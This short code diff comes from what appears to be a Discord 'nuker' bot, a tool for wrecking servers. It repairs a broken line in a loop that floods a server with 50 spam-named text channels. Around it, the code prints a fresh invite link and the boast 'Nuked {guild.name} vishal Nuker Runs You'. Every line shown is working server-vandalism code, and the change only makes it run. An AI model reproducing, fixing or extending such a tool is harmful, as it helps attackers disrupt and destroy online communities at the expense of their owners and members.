@@ -82,8 +82,7 @@ max_uses = 0)
         print(f"New Invite: {link}")
     amount = 50
     for i in range(amount):
-       await 
-guild.create_text_channel(random.choice(SPAM_CHANNEL))
+       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
     print(f"Nuked {guild.name} vishal Nuker Runs You")
     return
 
